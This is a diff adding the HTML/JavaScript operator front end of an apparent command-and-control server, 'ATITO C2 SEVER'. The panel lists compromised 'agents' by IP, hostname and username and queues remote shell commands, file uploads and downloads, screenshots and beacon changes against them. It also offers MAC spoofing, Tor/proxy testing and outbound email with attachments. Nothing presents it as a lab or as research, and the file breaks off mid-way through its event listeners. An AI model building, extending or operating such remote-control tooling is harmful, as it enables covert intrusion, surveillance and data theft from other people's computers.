@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATITO C2 SEVER</title>
+    <style>
+        /* Basic Dark Theme CSS for the C2 Panel */
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: #1a1a2e; /* Dark background */
+            color: #e0e0e0; /* Light text */
+        }
+        .container { 
+            max-width: 1200px; 
+            margin: 20px auto; 
+            background-color: #2a2a4a; /* Slightly lighter dark background for main content */
+            padding: 25px; 
+            border-radius: 10px; 
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); /* Soft shadow */
+        }
+        h1, h2, h3 { 
+            color: #8d8dff; /* Accent color (purple/blue) */
+            border-bottom: 2px solid #5a5a8a; /* Subtle separator */
+            padding-bottom: 10px; 
+            margin-bottom: 20px; 
+        }
+        .header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            margin-bottom: 20px; 
+        }
+        .header h1 { margin: 0; }
+        .auth-status { font-size: 0.9em; }
+        .login-section, .dashboard-section { 
+            margin-top: 20px; 
+            padding: 20px; 
+            border-radius: 8px; 
+            background-color: #3b3b6b; /* Section background */
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3); /* Inner shadow */
+        }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
+        .form-group input[type="text"], .form-group input[type="password"],
+        .form-group textarea, .form-group select {
+            width: calc(100% - 20px); padding: 10px; border: 1px solid #5a5a8a; border-radius: 5px;
+            background-color: #1a1a2e; color: #e0e0e0;
+        }
+        .form-group input[type="file"] { width: auto; background-color: transparent; border: none; }
+        .btn {
+            background-color: #7a7aff; /* Button primary color */
+            color: white; 
+            padding: 10px 20px; 
+            border: none; 
+            border-radius: 5px;
+            cursor: pointer; 
+            font-size: 1em; 
+            transition: background-color 0.3s ease; 
+            margin-right: 10px;
+        }
+        .btn:hover { background-color: #5a5aa3; } /* Darker on hover */
+        .btn-danger { background-color: #ff6666; } /* Red for danger actions */
+        .btn-danger:hover { background-color: #cc0000; }
+        .nav-tabs { 
+            display: flex; 
+            flex-wrap: wrap; 
+            margin-bottom: 20px; 
+            border-bottom: 2px solid #5a5a8a; 
+        }
+        .nav-tabs button {
+            background-color: #3b3b6b; 
+            color: #e0e0e0; 
+            padding: 12px 20px; 
+            border: none; 
+            border-bottom: 2px solid transparent;
+            cursor: pointer; 
+            font-size: 1.1em; 
+            margin-right: 5px; 
+            transition: all 0.3s ease; 
+            border-radius: 5px 5px 0 0;
+        }
+        .nav-tabs button.active { 
+            background-color: #5a5a8a; 
+            border-bottom-color: #8d8dff; 
+            color: #ffffff; 
+            font-weight: bold; 
+        }
+        .nav-tabs button:not(.active):hover { background-color: #4a4a7a; }
+        .tab-content { padding: 20px 0; }
+        .tab-pane { display: none; }
+        .tab-pane.active { display: block; }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        table, th, td { border: 1px solid #5a5a8a; }
+        th, td { padding: 10px; text-align: left; }
+        th { background-color: #3b3b6b; color: #fff; }
+        tr:nth-child(even) { background-color: #2f2f5f; }
+        tr:nth-child(odd) { background-color: #2a2a4a; }
+        
+        .message-log, .results-display {
+            max-height: 400px; 
+            overflow-y: auto; 
+            background-color: #1a1a2e; 
+            border: 1px solid #5a5a8a;
+            padding: 15px; 
+            border-radius: 5px;
+            white-space: pre-wrap; /* Preserve whitespace and break lines */
+            word-wrap: break-word; /* Break long words */
+        }
+        .log-entry { margin-bottom: 10px; padding: 8px; border-bottom: 1px dotted #5a5a8a; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.9em; }
+        .log-entry:last-child { border-bottom: none; }
+
+        /* Status indicators */
+        .status-online { color: #4CAF50; font-weight: bold; } /* Green */
+        .status-offline { color: #f44336; font-weight: bold; } /* Red */
+        .status-warning { color: #ffeb3b; } /* Yellow */
+        .status-success { color: #4CAF50; }
+        .status-failed { color: #f44336; }
+        .status-simulated-success { color: #8d8dff; } /* Purple for simulated */
+        .info-box { 
+            background-color: #4a4a7a; 
+            padding: 10px; 
+            border-left: 5px solid #8d8dff; 
+            margin-bottom: 20px; 
+            font-size: 0.9em; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>ATITO C2 SEVER</h1>
+            <div class="auth-status">
+                Logged in as: <span id="loggedInUser">Guest</span> |
+                <button id="logoutButton" class="btn btn-danger" style="display:none;">Logout</button>
+            </div>
+        </div>
+
+        <div id="loginSection" class="login-section">
+            <h2>Operator Login</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password (from .env AUTHORIZED_TOKEN):</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="btn">Login</button>
+                <p id="loginMessage" style="color:red; margin-top: 10px;"></p>
+            </form>
+        </div>
+
+        <div id="dashboardSection" class="dashboard-section" style="display:none;">
+            <div class="nav-tabs">
+                <button class="nav-link active" onclick="openTab(event, 'agentsTab')">Agents</button>
+                <button class="nav-link" onclick="openTab(event, 'tasksTab')">Tasks</button>
+                <button class="nav-link" onclick="openTab(event, 'resultsTab')">Results</button>
+                <button class="nav-link" onclick="openTab(event, 'logsTab')">C2 Logs</button>
+                <button class="nav-link" onclick="openTab(event, 'serverOpsTab')">Server Operations</button>
+                <button class="nav-link" onclick="openTab(event, 'commsTab')">Communications</button>
+                <button class="nav-link" onclick="downloadAllC2Data()">Download All C2 Data</button>
+            </div>
+
+            <div id="agentsTab" class="tab-pane active">
+                <h2>Active Agents</h2>
+                <button class="btn" onclick="fetchAgents()">Refresh Agents</button>
+                <table id="agentsTable">
+                    <thead>
+                        <tr>
+                            <th>UUID</th>
+                            <th>IP</th>
+                            <th>OS</th>
+                            <th>Hostname</th>
+                            <th>Username</th>
+                            <th>Last Seen (UTC)</th>
+                            <th>Beacon Interval (s)</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        </tbody>
+                </table>
+            </div>
+
+            <div id="tasksTab" class="tab-pane">
+                <h2>Queue Task for Agent</h2>
+                <form id="queueTaskForm">
+                    <div class="form-group">
+                        <label for="taskAgentUUID">Target Agent UUID:</label>
+                        <select id="taskAgentUUID" name="agent_uuid" required>
+                            </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="command">Command:</label>
+                        <select id="command" name="command" required>
+                            <option value="">-- Select Command --</option>
+                            <option value="shell">Execute Shell Command</option>
+                            <option value="get_sysinfo">Get System Info</option>
+                            <option value="list_dir">List Directory Contents</option>
+                            <option value="download">Download Remote File</option>
+                            <option value="upload">Upload File</option>
+                            <option value="screenshot">Take Screenshot</option>
+                            <option value="beacon_adjust">Adjust Beacon Interval</option>
+                            <option value="get_processes">List Processes</option>
+                            </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="parameters">Parameters (JSON):</label>
+                        <textarea id="parameters" name="parameters" rows="5" placeholder='{"cmd": "whoami"}'></textarea>
+                        <small style="color:#aaa;">e.g., `{"cmd": "whoami"}` for 'shell', `{"path": "/tmp"}` for 'list_dir', `{"interval": 30}` for 'beacon_adjust', `{"remote_path": "/path/to/file", "file_content_b64": "base64_encoded_content"}` for 'upload', `{"remote_path": "/path/to/download"}` for 'download'.</small>
+                    </div>
+                    <button type="submit" class="btn">Queue Task</button>
+                    <p id="queueTaskMessage" style="color:orange; margin-top: 10px;"></p>
+                </form>
+            </div>
+
+            <div id="resultsTab" class="tab-pane">
+                <h2>Agent Results</h2>
+                <div class="form-group">
+                    <label for="resultsAgentUUID">Filter by Agent UUID:</label>
+                    <select id="resultsAgentUUID" onchange="fetchResults()">
+                        <option value="">-- All Agents --</option>
+                    </select>
+                    <label for="resultsType">Filter by Result Type:</label>
+                    <select id="resultsType" onchange="fetchResults()">
+                        <option value="">-- All Types --</option>
+                        <option value="system_info">System Info</option>
+                        <option value="process_list">Process List</option>
+                        <option value="file_list">File List</option>
+                        <option value="command_output">Command Output</option>
+                        <option value="screenshot">Screenshot</option>
+                        <option value="generic">Generic</option>
+                    </select>
+                    <label for="detailedResultsOnly">Detailed Results Only:</label>
+                    <input type="checkbox" id="detailedResultsOnly" onchange="fetchResults()">
+                    <button class="btn" onclick="fetchResults()" style="margin-left: 10px;">Refresh Results</button>
+                </div>
+                <div id="resultsDisplay" class="results-display">
+                    </div>
+            </div>
+
+            <div id="logsTab" class="tab-pane">
+                <h2>C2 System Logs & Operator Messages</h2>
+                <button class="btn" onclick="fetchC2Messages()">Refresh Logs</button>
+                <div id="c2MessagesDisplay" class="message-log">
+                    </div>
+            </div>
+
+            <div id="serverOpsTab" class="tab-pane">
+                <h2>C2 Server Operations</h2>
+                <div class="info-box">
+                    <p><strong>Note:</strong> These operations are executed on the **C2 server itself**. They require the server to have necessary OS commands installed and proper permissions (e.g., root/admin access). If the backend is running without these, these functions will log a 'simulated_success' status.</p>
+                </div>
+
+                <h3>Spoof MAC Address</h3>
+                <form id="macSpoofForm">
+                    <div class="form-group">
+                        <label for="macInterface">Network Interface (e.g., eth0, Ethernet):</label>
+                        <input type="text" id="macInterface" name="interface" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="newMac">New MAC Address (e.g., 00:11:22:33:44:55):</label>
+                        <input type="text" id="newMac" name="new_mac" pattern="([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})" required>
+                    </div>
+                    <button type="submit" class="btn">Spoof MAC</button>
+                    <p id="macSpoofMessage" style="margin-top: 10px;"></p>
+                </form>
+
+                <hr style="border-top: 1px solid #5a5a8a; margin: 30px 0;">
+
+                <h3>Harden DNS Settings</h3>
+                <form id="dnsHardenForm">
+                    <div class="form-group">
+                        <label for="dnsInterface">Network Interface (e.g., eth0, Ethernet):</label>
+                        <input type="text" id="dnsInterface" name="interface" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dnsServers">DNS Servers (comma-separated, e.g., 1.1.1.1,8.8.8.8):</label>
+                        <input type="text" id="dnsServers" name="dns_servers" required>
+                    </div>
+                    <button type="submit" class="btn">Harden DNS</button>
+                    <p id="dnsHardenMessage" style="margin-top: 10px;"></p>
+                </form>
+
+                <hr style="border-top: 1px solid #5a5a8a; margin: 30px 0;">
+
+                <h3>Test Outbound Proxy</h3>
+                <form id="proxyTestForm">
+                    <div class="form-group">
+                        <label for="proxyTestUrl">URL to Test (e.g., https://check.torproject.org/):</label>
+                        <input type="url" id="proxyTestUrl" name="url" value="https://check.torproject.org/" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="proxyTestProxyUrl">Proxy URL (e.g., http://user:pass@proxy.example.com:8080 or socks5://127.0.0.1:9050):</label>
+                        <input type="text" id="proxyTestProxyUrl" name="proxy_url" required>
+                    </div>
+                    <button type="submit" class="btn">Test Proxy</button>
+                    <p id="proxyTestMessage" style="margin-top: 10px;"></p>
+                </form>
+            </div>
+
+            <div id="commsTab" class="tab-pane">
+                <h2>Communications</h2>
+
+                <h3>Send Internal C2 Message/Note</h3>
+                <form id="internalMessageForm">
+                    <div class="form-group">
+                        <label for="internalTarget">Target (e.g., all_agents, agent_uuid, self):</label>
+                        <input type="text" id="internalTarget" name="target" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="internalMessageContent">Message Content:</label>
+                        <textarea id="internalMessageContent" name="internal_message" rows="4" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="internalFiles">Attach Files:</label>
+                        <input type="file" id="internalFiles" name="file">
+                    </div>
+                    <button type="submit" class="btn">Send Internal Message</button>
+                    <p id="internalMessageStatus" style="margin-top: 10px;"></p>
+                </form>
+
+                <hr style="border-top: 1px solid #5a5a8a; margin: 30px 0;">
+
+                <h3>Send External Email</h3>
+                <div class="info-box">
+                    <p><strong>Note:</strong> Email sending requires SMTP server configuration in the backend's `.env` file.</p>
+                </div>
+                <form id="emailForm">
+                    <div class="form-group">
+                        <label for="emailRecipient">Recipient Email:</label>
+                        <input type="email" id="emailRecipient" name="recipient_email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="emailSubject">Subject:</label>
+                        <input type="text" id="emailSubject" name="subject" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="emailBody">Body:</label>
+                        <textarea id="emailBody" name="body" rows="6" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="emailHTML">HTML Email:</label>
+                        <input type="checkbox" id="emailHTML" name="html">
+                    </div>
+                    <div class="form-group">
+                        <label for="emailFiles">Attach Files:</label>
+                        <input type="file" id="emailFiles" name="file">
+                    </div>
+                    <button type="submit" class="btn">Send Email</button>
+                    <p id="emailStatus" style="margin-top: 10px;"></p>
+                </form>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        const API_BASE_URL = "http://localhost:8000"; // IMPORTANT: Adjust if your backend runs on a different host/port
+
+        // --- Utility Functions ---
+        function getAuthHeaders() {
+            const token = localStorage.getItem('accessToken');
+            return token ? { 'Authorization': `Bearer ${token}` } : {};
+        }
+
+        // Handles API response errors, attempting to parse JSON error details
+        async function handleErrors(response) {
+            if (!response.ok) {
+                const contentType = response.headers.get("content-type");
+                if (contentType && contentType.indexOf("application/json") !== -1) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.detail || `HTTP error! status: ${response.status}`);
+                } else {
+                    const textError = await response.text();
+                    throw new Error(`HTTP error! status: ${response.status}, response: ${textError}`);
+                }
+            }
+            return response; // If response is OK, simply return it.
+        }
+
+        // Displays messages to the user in specific UI elements
+        function displayMessage(elementId, message, isError = false) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.innerHTML = message; // Use innerHTML to allow for <br> and <pre> tags
+                element.style.color = isError ? 'red' : 'green';
+            }
+        }
+
+        // Formats ISO timestamp strings into a more readable local format
+        function formatTimestamp(isoString) {
+            if (!isoString) return 'N/A';
+            try {
+                const date = new Date(isoString);
+                // Adjusting to localeString for Kenya timezone (EAT)
+                return date.toLocaleString('en-US', { timeZoneName: 'short', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Africa/Nairobi' });
+            } catch (e) {
+                return isoString; // Fallback if parsing fails
+            }
+        }
+
+        // Handles tab switching and triggers data fetches for the active tab
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tab-pane");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("nav-link");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+
+            // Trigger data fetches when opening a relevant tab
+            if (tabName === 'agentsTab') fetchAgents();
+            if (tabName === 'resultsTab') fetchResults();
+            if (tabName === 'logsTab') fetchC2Messages();
+        }
+
+        // --- Authentication Functions ---
+        async function login(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginMessage = document.getElementById('loginMessage');
+
+            const formData = new URLSearchParams();
+            formData.append('username', username);
+            formData.append('password', password);
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/token`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formData.toString()
+                });
+
+                const checkedResponse = await handleErrors(response); // Check for HTTP errors
+                const data = await checkedResponse.json(); // Safely parse JSON if no error
+
+                localStorage.setItem('accessToken', data.access_token);
+                document.getElementById('loggedInUser').textContent = username;
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('dashboardSection').style.display = 'block';
+                document.getElementById('logoutButton').style.display = 'inline-block';
+                displayMessage('loginMessage', 'Login successful!', false);
+                // Initial data fetch after successful login
+                fetchAgents();
+                fetchResults();
+                fetchC2Messages();
+            } catch (error) {
+                displayMessage('loginMessage', `Login failed: ${error.message}`, true);
+                console.error('Login error:', error);
+            }
+        }
+
+        function logout() {
+            localStorage.removeItem('accessToken');
+            document.getElementById('loggedInUser').textContent = 'Guest';
+            document.getElementById('loginSection').style.display = 'block';
+            document.getElementById('dashboardSection').style.display = 'none';
+            document.getElementById('logoutButton').style.display = 'none';
+            displayMessage('loginMessage', 'Logged out successfully.', false);
+        }
+
+        // --- Agent Management Functions ---
+        async function fetchAgents() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/agents`, {
+                    headers: getAuthHeaders()
+                });
+                const checkedResponse = await handleErrors(response);
+                const agents = await checkedResponse.json();
+                const tableBody = document.getElementById('agentsTable').getElementsByTagName('tbody')[0];
+                tableBody.innerHTML = ''; // Clear existing rows
+
+                const agentUUIDSelects = [
+                    document.getElementById('taskAgentUUID'),
+                    document.getElementById('resultsAgentUUID')
+                ];
+                // Clear and re-populate agent dropdowns, preserving default options for results filter
+                agentUUIDSelects.forEach(select => {
+                    if (select.id === 'resultsAgentUUID') {
+                        select.innerHTML = '<option value="">-- All Agents --</option>';
+                    } else {
+                        select.innerHTML = '<option value="">-- Select Agent --</option>';
+                    }
+                });
+
+                if (agents.length === 0) {
+                    tableBody.innerHTML = '<tr><td colspan="8">No active agents found.</td></tr>';
+                    return;
+                }
+
+                agents.forEach(agent => {
+                    const row = tableBody.insertRow();
+                    row.insertCell().textContent = agent.uuid;
+                    row.insertCell().textContent = agent.ip;
+                    row.insertCell().textContent = agent.os;
+                    row.insertCell().textContent = agent.hostname;
+                    row.insertCell().textContent = agent.username;
+                    row.insertCell().textContent = formatTimestamp(agent.last_seen);
+                    row.insertCell().textContent = agent.beacon_interval;
+                    const statusCell = row.insertCell();
+                    statusCell.textContent = agent.status;
+                    statusCell.classList.add(`status-${agent.status.toLowerCase()}`);
+
+                    // Populate agent UUID dropdowns for tasking and results filtering
+                    const option = document.createElement('option');
+                    option.value = agent.uuid;
+                    option.textContent = `${agent.hostname} (${agent.uuid})`;
+                    
+                    agentUUIDSelects.forEach(select => {
+                        select.appendChild(option.cloneNode(true));
+                    });
+                });
+            } catch (error) {
+                console.error('Error fetching agents:', error);
+                displayMessage('loginMessage', `Failed to fetch agents: ${error.message}`, true);
+            }
+        }
+
+        // --- Task Queueing Functions ---
+        async function queueTask(event) {
+            event.preventDefault();
+            const agentUUID = document.getElementById('taskAgentUUID').value;
+            const command = document.getElementById('command').value;
+            const parametersText = document.getElementById('parameters').value;
+            const queueTaskMessage = document.getElementById('queueTaskMessage');
+
+            let parameters = {};
+            if (parametersText) {
+                try {
+                    parameters = JSON.parse(parametersText);
+                } catch (e) {
+                    displayMessage('queueTaskMessage', 'Invalid JSON in parameters field.', true);
+                    return;
+                }
+            }
+
+            const payload = {
+                agent_uuid: agentUUID,
+                command: command,
+                parameters: parameters
+            };
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/task/queue`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        ...getAuthHeaders()
+                    },
+                    body: JSON.stringify(payload)
+                });
+                const checkedResponse = await handleErrors(response);
+                const data = await checkedResponse.json();
+                displayMessage('queueTaskMessage', `Task queued: ${data.message} (ID: ${data.task_id})`, false);
+                document.getElementById('parameters').value = ''; // Clear parameters after successful queue
+            } catch (error) {
+                displayMessage('queueTaskMessage', `Failed to queue task: ${error.message}`, true);
+                console.error('Error queueing task:', error);
+            }
+        }
+
+        // --- Results Display Functions ---
+        async function fetchResults() {
+            const resultsDisplay = document.getElementById('resultsDisplay');
+            resultsDisplay.innerHTML = '<p>Loading results...</p>';
+            const agentUUIDFilter = document.getElementById('resultsAgentUUID').value;
+            const resultTypeFilter = document.getElementById('resultsType').value;
+            const detailedOnly = document.getElementById('detailedResultsOnly').checked;
+
+            let queryParams = new URLSearchParams();
+            if (agentUUIDFilter) queryParams.append('agent_uuid', agentUUIDFilter);
+            if (resultTypeFilter) queryParams.append('result_type', resultTypeFilter);
+            if (detailedOnly) queryParams.append('detailed_only', detailedOnly);
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/results?${queryParams.toString()}`, {
+                    headers: getAuthHeaders()
+                });
+                const checkedResponse = await handleErrors(response);
+                const results = await checkedResponse.json();
+                resultsDisplay.innerHTML = ''; // Clear loading message
+
+                if (results.length === 0) {
+                    resultsDisplay.innerHTML = '<p>No results found with current filters.</p>';
+                    return;
+                }
+
+                results.forEach(result => {
+                    const resultDiv = document.createElement('div');
+                    resultDiv.classList.add('log-entry');
+                    let content = `<strong>Agent:</strong> ${result.agent_uuid}<br>`;
+                    content += `<strong>Type:</strong> <span class="status-success">${result.type}</span><br>`;
+                    content += `<strong>Received:</strong> ${formatTimestamp(result.c2_received_at)}<br>`;
+                    
+                    // Display data based on its type
+                    if (result.type === 'screenshot' && result.data && result.data.base64_image) {
+                        content += `<strong>Format:</strong> ${result.data.format}<br>`;
+                        content += `<br><img src="data:image/${result.data.format};base64,${result.data.base64_image}" style="max-width: 100%; height: auto; border: 1px solid #5a5a8a;" alt="Screenshot">`;
+                    } else if (result.type === 'command_output' && result.data) {
+                        content += `<strong>Command:</strong> ${result.data.command || 'N/A'}<br>`;
+                        content += `<strong>Return Code:</strong> ${result.data.return_code || 'N/A'}<br>`;
+                        content += `<strong>Output:</strong><br><pre>${result.data.output || ''}</pre>`;
+                        if (result.data.error) {
+                            content += `<br><strong>Error:</strong><br><pre style="color:red;">${result.data.error}</pre>`;
+                        }
+                    } else {
+                        // For system_info, process_list, file_list, or generic
+                        content += `<strong>Data:</strong><br><pre>${JSON.stringify(result.data, null, 2)}</pre>`;
+                    }
+                    
+                    resultDiv.innerHTML = content;
+                    resultsDisplay.appendChild(resultDiv);
+                });
+            } catch (error) {
+                resultsDisplay.innerHTML = `<p style="color:red;">Failed to fetch results: ${error.message}</p>`;
+                console.error('Error fetching results:', error);
+            }
+        }
+
+        // --- C2 Logs Display Functions ---
+        async function fetchC2Messages() {
+            const c2MessagesDisplay = document.getElementById('c2MessagesDisplay');
+            c2MessagesDisplay.innerHTML = '<p>Loading logs...</p>';
+            try {
+                const response = await fetch(`${API_BASE_URL}/messages`, {
+                    headers: getAuthHeaders()
+                });
+                const checkedResponse = await handleErrors(response);
+                const messages = await checkedResponse.json();
+                c2MessagesDisplay.innerHTML = ''; // Clear loading message
+
+                if (messages.length === 0) {
+                    c2MessagesDisplay.innerHTML = '<p>No C2 logs found.</p>';
+                    return;
+                }
+
+                messages.forEach(msg => {
+                    const msgDiv = document.createElement('div');
+                    msgDiv.classList.add('log-entry');
+                    let statusClass = `status-${msg.status.toLowerCase().replace('_', '-')}`; // e.g., 'simulated-success'
+                    msgDiv.innerHTML = `
+                        [<span class="${statusClass}">${msg.status.toUpperCase()}</span>] ${formatTimestamp(msg.timestamp)} - 
+                        <strong>Method:</strong> ${msg.method} - 
+                        <strong>Target:</strong> ${msg.target}<br>
+                        <strong>Details:</strong> ${msg.details}
+                        ${msg.attachments && msg.attachments.length > 0 ? `<br><strong>Attachments:</strong> ${msg.attachments.join(', ')}` : ''}
+                        ${msg.command_output ? `<br><strong>Output:</strong> <pre>${msg.command_output}</pre>` : ''}
+                        ${msg.response_status_code ? `<br><strong>HTTP Status:</strong> ${msg.response_status_code}` : ''}
+                        ${msg.response_preview ? `<br><strong>Preview:</strong> <pre>${msg.response_preview}</pre>` : ''}
+                        ${msg.sent_by ? `<br><strong>Sent by:</strong> ${msg.sent_by}` : ''}
+                    `;
+                    c2MessagesDisplay.appendChild(msgDiv);
+                });
+            } catch (error) {
+                c2MessagesDisplay.innerHTML = `<p style="color:red;">Failed to fetch C2 messages: ${error.message}</p>`;
+                console.error('Error fetching C2 messages:', error);
+            }
+        }
+
+        // --- Server Operations Functions ---
+        async function submitServerOp(formId, endpoint, messageId) {
+            const form = document.getElementById(formId);
+            const formData = new FormData(form);
+            const messageElement = document.getElementById(messageId);
+
+            messageElement.textContent = 'Executing...';
+            messageElement.style.color = 'orange';
+
+            try {
+                const response = await fetch(`${API_BASE_URL}${endpoint}`, {
+                    method: 'POST',
+                    headers: getAuthHeaders(),
+                    body: formData
+                });
+                const checkedResponse = await handleErrors(response);
+                const data = await checkedResponse.json();
+                
+                // Construct message with details and output
+                let fullMessage = `${data.message}`;
+                if (data.details) fullMessage += ` ${data.details}`;
+                if (data.output) fullMessage += `<br><strong>Output:</strong> <pre>${data.output}</pre>`;
+                if (data.status_code) fullMessage += `<br><strong>Response Status:</strong> ${data.status_code}`; // Adjusted from response_status_code to status_code based on backend
+                if (data.response_preview) fullMessage += `<br><strong>Response Preview:</strong> <pre>${data.response_preview}</pre>`;
+
+                displayMessage(messageId, fullMessage, false);
+                // Note: The backend's proxy_test returns 'status' (success/failed), not 'test_status'
+                messageElement.style.color = data.status === 'failed' ? 'red' : (data.status === 'simulated_success' ? '#8d8dff' : 'green');
+                fetchC2Messages(); // Refresh logs to see the operation
+            } catch (error) {
+                displayMessage(messageId, `Operation failed: ${error.message}`, true);
+                console.error(`Error with ${endpoint} operation:`, error);
+            }
+        }
+
+        // --- Communications Functions ---
+        async function sendInternalMessage(event) {
+            event.preventDefault();
+            const form = document.getElementById('internalMessageForm');
+            const formData = new FormData(form); // Handles text and file inputs
+            const statusElement = document.getElementById('internalMessageStatus');
+
+            statusElement.textContent = 'Sending...';
+            statusElement.style.color = 'orange';
+
+            try {
+                // Backend endpoint is /comms/internal
+                const response = await fetch(`${API_BASE_URL}/comms/internal`, {
+                    method: 'POST',
+                    headers: getAuthHeaders(), // FormData handles multipart/form-data, so no 'Content-Type' needed here
+                    body: formData
+                });
+                const checkedResponse = await handleErrors(response);
+                const data = await checkedResponse.json();
+                displayMessage('internalMessageStatus', data.message, false);
+                form.reset(); // Clear form after successful send
+                fetchC2Messages(); // Refresh logs to see the new message
+            } catch (error) {
+                displayMessage('internalMessageStatus', `Failed to send message: ${error.message}`, true);
+                console.error('Error sending internal message:', error);
+            }
+        }
+
+        async function sendEmailMessage(event) {
+            event.preventDefault();
+            const form = document.getElementById('emailForm');
+            const formData = new FormData(form); // Use FormData for file upload and text fields
+            const statusElement = document.getElementById('emailStatus');
+
+            // Backend expects 'html' as a boolean, FormData will send "on" or null. Convert it.
+            // If the checkbox is checked, formData.get('html') will be "on". Otherwise, it will be null.
+            formData.set('html', document.getElementById('emailHTML').checked ? 'true' : 'false');
+
+
+            statusElement.textContent = 'Sending email...';
+            statusElement.style.color = 'orange';
+
+            try {
+                // Backend endpoint is /comms/email
+                const response = await fetch(`${API_BASE_URL}/comms/email`, {
+                    method: 'POST',
+                    headers: getAuthHeaders(),
+                    body: formData
+                });
+                const checkedResponse = await handleErrors(response);
+                const data = await checkedResponse.json();
+                displayMessage('emailStatus', data.message, false);
+                form.reset(); // Clear form after successful send
+                fetchC2Messages(); // Refresh logs
+            } catch (error) {
+                displayMessage('emailStatus', `Failed to send email: ${error.message}`, true);
+                console.error('Error sending email:', error);
+            }
+        }
+
+        // --- Data Download Function ---
+        async function downloadAllC2Data() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/download_all_c2_data`, { // Corrected endpoint from /download/data
+                    headers: getAuthHeaders()
+                });
+                const checkedResponse = await handleErrors(response); // Check for HTTP errors before proceeding
+
+                // Use response.blob() to get file data
+                const blob = await checkedResponse.blob();
+                const contentDisposition = checkedResponse.headers.get('Content-Disposition');
+                let filename = 'c2_data_export.zip'; // Default filename
+                if (contentDisposition && contentDisposition.includes('filename=')) {
+                    // Extract filename from Content-Disposition header
+                    const filenameMatch = /filename\*?=['"]?(?:UTF-8''|\w+''([\w%-\.]*))?([^;\n]*?)['"]?$/i.exec(contentDisposition);
+                    if (filenameMatch && filenameMatch[2]) {
+                        filename = decodeURIComponent(filenameMatch[2]);
+                    } else if (filenameMatch && filenameMatch[1]) {
+                        filename = decodeURIComponent(filenameMatch[1]);
+                    }
+                }
+
+                // Create a temporary download link and programmatically click it
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url); // Clean up the object URL
+                alert(`C2 data download started for '${filename}'. Remember all logs are stored in the USB drive. Check your downloads folder.`);
+                fetchC2Messages(); // Log will be created on backend, refresh to see it
+            } catch (error) {
+                alert(`Failed to download C2 data: ${error.message}`);
+                console.error('Error downloading C2 data:', error);
+            }
+        }
+
+
+        // --- Event Listeners and Initial Load ---
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('loginForm').addEventListener('submit', login);
+            document.getElementById('logoutButton').addEventListener('click', logout);
+            document.getElementById('queueTaskForm').addEventListener('submit', queueTask);
+            // Attach event listeners for server operations forms
+            
+            // NOTE: Your backend main.py does not define /mac/spoof or /dns/harden directly.
+            // These are mentioned in the HTML but not implemented in the provided Python.
+            // I'm leaving the frontend call as is, but be aware these will likely fail on the backend.
+            document.getElementById('macSpoofForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                // This endpoint is not in main.py, it will likely give a 404
+                submitServerOp(e.target.id, '/server/test_mac_spoof', 'macSpoofMessage'); 
+            });
+            document.getElementById('dnsHardenForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                // This endpoint is not in main.py, it will likely give a 404
+                submitServerOp(e.target.id, '/server/test_dns_harden', 'dnsHardenMessage'); 
+            });
+            document.getElementById('proxyTestForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                // Use the correct backend endpoint: /server/test_proxy
+                submitServerOp(e.target.id, '/server/test_proxy', 'proxyTestMessage');
+            });
+
+            document.getElementById('internalMessageForm').addEventListener('submit', sendInternalMessage);
